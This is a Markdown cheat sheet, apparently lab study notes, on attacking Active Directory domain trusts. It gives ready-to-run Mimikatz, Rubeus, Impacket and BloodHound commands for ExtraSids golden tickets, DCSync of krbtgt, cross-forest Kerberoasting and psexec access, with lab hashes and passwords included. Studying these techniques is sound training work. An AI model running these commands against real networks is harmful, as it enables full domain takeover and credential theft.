# Trust me..
## Enumerating Domain Trust
### Using Activedirectory module
```powershell
Import-Module activedirectory
Get-ADTrust -filter *
```
### Using PowerView
```powershell
Get-DomainTrust
Get-DomainTrustMapping
```
### Checking users in the Child Domain
```powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```
### Using `netdom` to enumerate domain trust
```cmd
netdom query /domain:inlanefreight.local trust
```
- Query domain controller
```cmd
netdom query /domain:inlanefreight.local dc
```
- query workstations
```cmd
netdom query /domain:inlanefreight.local workstation
```
> We can utilize Bloodhound Cypher queries to map domain trusts

## Attacking Domain Trusts - [Child -> Parent Trusts] - from Windows
### Abusing SID History
- when a user is migrated from a domain to another, His original `sid` is stored in the sidHistory Attribute, so he can still be remembered when trying to access the old domain, Hence we can add an `Administrator`'s SID to his SID History so it would be added to the user's token and then this user can perform DCSync and Goldeen Ticket
## ExtraSids Attack - Windows (Mimikatz & Rubeus) 
- in this attack, when a Child domain is compromised it could be escalated to compromise the Parent domain by adding a user account (or even creating new one) to **Enterprise Admin Group**, which will give him ADMIN permission in the Parent domain- this happens by Injecting the SID of this Group to our user.
#### To perform this attack after compromising a child domain, we need the following:
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
With this data collected, the attack can be performed with Mimikatz.
### Getting the NT Hash of the Child domain using mimkatz
```powershell
lsadump::dcsync /user:LOGISTICS\krbtgt
```
### Getting the SID of the child domain `PowerView` (Could be obtained from mimikatz)
```powershell
Get-DomainSID
```
### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
- using built-in `Get-ADGroup`
- ```powershell
  Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
  ```
### check that we got no Access to the parent domain
```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```
### Exploitation - Golden Ticket - **Mimikatz**
```powershell
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
- check the TGT
```POWERSHELL
klist
```
- Confirm the ADMIN access on the parent domain
```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```
### Exploitation - Golden Ticket - Rubeus
```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
### Exploitation - DCSync against parent domain
```powershell
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
# We can specify the target domain
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

## ExtraSids Attack - Linux
### Perform DCSync to get the NT hash of krbtgt - Impacket-secretsdump
```bash
impacket-secretsdump logistics.inlanefreight.local/htb-student_adm:'MyaADMIN21E31aa#'@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

### Get domain SID - Impacket-lookupsid
```bash
impacket-lookupsid logistics.inlanefreight.local/htb-student_adm:'MyaADMIN21E31aa#'@172.16.5.240 | grep "Domain SID"
```
### Getting Target Group SID - Impacket-lookupsid
```bash
impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
### Golden Ticket using - Impacket-ticketer
```bash
impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
- save the path to the ticket in `krb5ccname`
```bash
export KRB5CCNAME=hacker.ccache
```
### Login as the new user in the Parent domain with SYSTEM rights
```bash
impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

### ExtraSids Attack using `impacket-raiseChild`
```bash
impacket-raiseChild -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm:'myadminPa@@13'
```

## Exploiting Cross-Forest Trust
### Cross-Forest Kerberoasting - Windows
- Enumerating accounts with SPN attached.
```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
- Enumerating the accounts we got from step `1`
```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
- Using `Rubeus` to perform kerberoasting
```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
- We can use the `PowerView` function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember/) to enumerate groups with users that do not belong to the domain, also known as `foreign group membership`. try this against the domains with which we have an external bidirectional forest trust.
```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
- Convert the SIDs we get to see who are these users in our domain
```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```
- Later we can try to login with a `PSSession` with that user
```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
### SID History Abuse - Cross Forest
SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. In the below diagram, we can see an example of the `jjones` user being migrated from the `INLANEFREIGHT.LOCAL` domain to the `CORP.LOCAL` domain in a different forest. If SID filtering is not enabled when this migration is made and the user has administrative privileges (or any type of interesting rights such as ACE entries, access to shares, etc.) in the `INLANEFREIGHT.LOCAL` domain, then they will retain their administrative rights/access in `INLANEFREIGHT.LOCAL` while being a member of the new domain, `CORP.LOCAL` in the second forest.

### Cross-Forest Kerberoasting - Linux
- Using Impacket-GetUserSPN
```bash
impacket-GetUserSPNs -target-domain trustedDomain.local currentDomain.local/myuser:'myuserPas$123' 
```
- Add the `-request` flag to request the `TGS` and `-outputfile`
```bash
impacket-GetUserSPNs -target-domain trustedDomain.local currentDomain.local/myuser:'myuserPas$123' -request -outputfile kerberoasted.txt
```
- crack with john / `hashcat` with mode `-m 13100`
### Enumerating Foreign Group Membership with Bloodhound-python
- Collecting bloodhound data from the current domain
```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2 --zip
```
- Collecting bloodhound data from the foreign domain
```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```
- Now we check bloodhound Cypher queries to get `Users with Foreign Domain Group Membership`
